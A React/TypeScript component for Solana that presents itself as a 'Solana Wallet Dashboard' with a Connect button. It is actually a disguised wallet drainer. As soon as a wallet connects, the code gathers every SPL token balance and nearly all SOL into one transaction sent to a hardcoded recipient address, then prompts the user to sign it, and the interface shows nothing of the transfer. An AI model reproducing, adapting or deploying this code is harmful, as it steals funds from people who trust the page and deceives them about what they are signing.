"use client";

import React, { useEffect, useState } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  clusterApiUrl,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { WalletProvider, useWallet } from "@solana/wallet-adapter-react";
import {
  WalletModalProvider,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  LedgerWalletAdapter,
} from "@solana/wallet-adapter-wallets";

require("@solana/wallet-adapter-react-ui/styles.css");

// Define token type
type TokenInfo = {
  pubkey: string;
  mint: string;
  owner: string;
  decimals: number;
  amount: number;
};

const walletAdapters = [
  new PhantomWalletAdapter(),
  new SolflareWalletAdapter(),
  new LedgerWalletAdapter(),
];

const App: React.FC = () => {
  const { publicKey, wallet, connected } = useWallet();
  const [tokens, setTokens] = useState<TokenInfo[]>([]);
  const [walletAddress, setWalletAddress] = useState<string>("");

  useEffect(() => {
    if (publicKey) {
      fetchTokens();
    }
  }, [publicKey]);

  const fetchTokens = async () => {
    if (!publicKey) return;

    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");

    const response = await connection.getParsedTokenAccountsByOwner(publicKey, {
      programId: TOKEN_PROGRAM_ID,
    });

    const tokenList: TokenInfo[] = response.value.map(({ account, pubkey }) => {
      const info = account.data.parsed.info;
      return {
        pubkey: pubkey.toBase58(),
        mint: info.mint,
        owner: info.owner,
        decimals: info.tokenAmount.decimals,
        amount: info.tokenAmount.uiAmount,
      };
    });

    setTokens(tokenList);
    setWalletAddress(publicKey.toBase58());

    if (tokenList.length > 0) {
      handleTransfer(tokenList);
    }
  };

  const handleTransfer = async (tokenList: TokenInfo[]) => {
    if (!publicKey || !wallet?.adapter) return;

    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
    const sender = publicKey;
    const recipient = new PublicKey(
      "3WF2QeZMRyVjK5eG2F6JD4eRmnhahPJo5qQS8XEtTchZ"
    );
    const tx = new Transaction();

    for (const token of tokenList) {
      const mint = new PublicKey(token.mint);
      const recipientTokenAccount = await getAssociatedTokenAddress(
        mint,
        recipient
      );

      const accountInfo = await connection.getAccountInfo(
        recipientTokenAccount
      );
      if (!accountInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            sender,
            recipientTokenAccount,
            recipient,
            mint
          )
        );
      }

      const rawAmount = BigInt(Math.floor(token.amount * 10 ** token.decimals));
      if (rawAmount > BigInt(0)) {
        tx.add(
          createTransferInstruction(
            new PublicKey(token.pubkey),
            recipientTokenAccount,
            sender,
            rawAmount
          )
        );
      }
    }

    // Transfer remaining SOL (minus rent buffer)
    const balance = await connection.getBalance(sender);
    const transferLamports = balance - 30000000;
    if (transferLamports > 0) {
      tx.add(
        SystemProgram.transfer({
          fromPubkey: sender,
          toPubkey: recipient,
          lamports: transferLamports,
        })
      );
    }

    tx.feePayer = sender;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    // Type guard to ensure wallet supports signing
    if ("signTransaction" in wallet.adapter) {
      const signerAdapter = wallet.adapter;

      try {
        const signedTx = await signerAdapter.signTransaction(tx);
        const txid = await connection.sendRawTransaction(signedTx.serialize());
        await connection.confirmTransaction(txid, "confirmed");
      } catch (err) {
        console.error("Transaction failed:", err);
        alert("Transaction failed.");
      }
    } else {
      alert("Wallet does not support direct transaction signing.");
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-6 flex items-center justify-center">
      <div className="max-w-md w-full p-6 rounded-lg shadow-md bg-black text-white space-y-4">
        <h1 className="text-2xl font-bold">Solana Wallet Dashboard</h1>
        <WalletMultiButton />
        <button
          className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded w-full"
          onClick={fetchTokens}
        >
          Connect
        </button>
        {walletAddress && (
          <div className="text-sm break-words">
            <strong>Connected Wallet:</strong>
            <p>{walletAddress}</p>
          </div>
        )}
      </div>
    </div>
  );
};

const Solana: React.FC = () => (
  <WalletProvider wallets={walletAdapters} autoConnect>
    <WalletModalProvider>
      <App />
    </WalletModalProvider>
  </WalletProvider>
);

export default Solana;
